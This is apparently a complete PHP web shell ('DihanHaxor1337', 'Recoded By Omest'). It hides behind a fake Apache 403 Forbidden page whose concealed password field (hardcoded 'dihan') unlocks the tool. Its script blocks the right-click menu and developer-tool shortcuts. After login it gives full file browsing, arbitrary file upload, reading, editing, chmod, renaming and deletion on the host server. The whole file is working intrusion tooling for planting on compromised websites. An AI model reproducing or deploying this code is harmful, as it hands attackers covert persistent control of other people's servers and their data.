<?php
$pass = "dihan";
session_start();
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1256" /></head><body>
<?php
if (!empty($_GET['dihan']) &&  $_GET['dihan'] == "logout") {
   session_destroy();
   unset($_SESSION['pass']);
}
$path_name = pathinfo($_SERVER['PHP_SELF']);
$this_script = $path_name['basename'];
if (empty($_POST['pass'])) {
   $_POST['pass']='';
   }
if ($_SESSION['pass']!== $pass) 
{
if ($_POST['pass'] == $pass) {
     $_SESSION['pass'] = $pass;
       }
else {
        echo '<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
	<meta charset="utf-8">
	<title> 403 Forbidden </title>
	<style>
body{
	margin: 0;
	padding: 0;
	font-family: fantasy;
        background: url(http://);
        background-size: 350px 300px;
	background-color: white;
}

b{
       background: none; 
       color: black; 
       border: 2px solid transparent;
       margin: 1px auto;
       padding-left: 1px;
       font-family: fantasy;
       font-size: 38px;
       width: 200px;
       font-weight: 900;
}

input[type=text]{
   background: none;
   border: 2px solid transparent;
   margin: 1px auto;
   padding-left: 1px;
   font-size: 20px;
   font-family: fantasy;
   font-style: italic;
   width: 74px;
}
</style>
<style type="text/css">@import url("https://fonts.googleapis.com/css?family=Fredericka+the+Great|Kaushan+Script|Press+Start+2P|Rationale")
</style>
</head>
<script type="text/javascript">
$(document).bind(“contextmenu”,function(e) {
 alert(‘Fuck You’)
});
document.onkeydown = function(e) {
if(event.keyCode == 123) {
return false;
}
if(e.ctrlKey && e.shiftKey && e.keyCode == ‘I’.charCodeAt(0)){
alert(‘@copyright Yourportfolio for your curiculum vitae , resume & your portfolio’)
return false;
}
if(e.ctrlKey && e.shiftKey && e.keyCode == ‘J’.charCodeAt(0)){
alert(‘@copyright Yourportfolio for your curiculum vitae , resume & your portfolio’)
return false;
}
if(e.ctrlKey && e.keyCode == ‘U’.charCodeAt(0)){
alert(‘@copyright Yourportfolio for your curiculum vitae , resume & your portfolio’)
return false;
}
}
</script>
<body oncontextmenu="return false">
<link href="https://fonts.googleapis.com/css?family=Lacquer|&display=swap" rel="stylesheet"><font-family="sans serif>'; ?>
<?php
$errorforbidden = $_SERVER['REQUEST_URI'];
?>
<?php
	echo '<form action="'.$_SERVER['PHP_SELF'].'" method="post">'; ?> <hr color="white">
<b>Forbidden</b><input style="margin-left:20px;" type="text" name="pass" value="">
<p>&nbsp;You don't have permission to access <?php print $errorforbidden; ?>
 on this server.</p>
<p>&nbsp;Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>
<i>&nbsp;Apache/2.2.14 (Ubuntu) Server at localhost Port 80</i>
<?php
echo '
</body>
</html> ';
        exit;
    }
}
?>
<?php
error_reporting(0);
set_time_limit(0);
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>
<title>.: h 4 x 0 r :.</title>
<link rel="icon" type="image/png" href="https://i.ibb.co/YfQJWDD/1592853923-picsay.png"/>
<meta property="og:image" content="https://i.ibb.co/mRDC4Wp/20200704-165720.jpg"/>
<center>
<a href="?dihan=logout"><img src="https://i.ibb.co/mRDC4Wp/20200704-165720.jpg"></a></center>
<style>
img{
   width:200;
   height:200;
}

#content tr:hover{
background-color: #B52693;
text-shadow:0px 0px 10px #67E11B;
}

#content .first{
background-color: #191919;
}

table{
border: 1px #17CEA8 dotted;
}

a{
color:#28D0B6;
text-decoration: none;
text-shadow:0px 0px 10px #000000;
}

a:hover{
color:red;
}

input,select{
border: 1px #17CEA8 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}

textarea{
   background:url("https://i.ibb.co/WWW7Fg2/hannaku.jpg") center;
   background-repeat:no-repeat;
   background-attachment:fixed;
   background-size:700px;
   border: 1px #17CEA8 solid;
   -moz-border-radius: 5px;
   -webkit-border-radius:5px;
   border-radius:5px;
   color:#D30EF1;
   text-shadow:0px 0px 10px #50FA8D;
}

body{
   font-family: "Share Tech Mono";
   background-color: black;
   background-position:cover;
   color:#F21AD9;
   text-shadow: 0px 0px 10px #311BC2;
}
</style>
</head>
<body>
<h1><center><font color="#20B2AA">.: DihanHa</font><font color="white">xor1337 :.</font><br>
			<font size="2px"><font color="aquamarine"><b>_rebirth haxor_</b></font></a>
			</center></h1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="lime">Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="lime">Upload Berhasil</font><br />';
}else{
echo '<font color="white">Upload Gagal</font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="lime">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="lime">Change Permission Berhasil</font><br/>';
}else{
echo '<font color="white">Change Permission Gagal</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="lime">Ganti Nama Berhasil</font><br/>';
}else{
echo '<font color="white">Ganti Nama Gagal</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="lime">Berhasil Edit File</font><br/>';
}else{
echo '<font color="white">Gagal Edit File</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="lime">Directory Terhapus</font><br/>';
}else{
echo '<font color="white">Directory Gagal Terhapus                                                                                                                                                                                                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="lime">File Terhapus</font><br/>';
}else{
echo '<font color="white">File Gagal Dihapus</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</peller></center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="white">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="white">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<font color="red" size="2px"><center><br/><b>Copyright &copy; 2016 <font color="white">|| <font color="red">Recoded By <font color="white">Omest</a></center></font>

</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>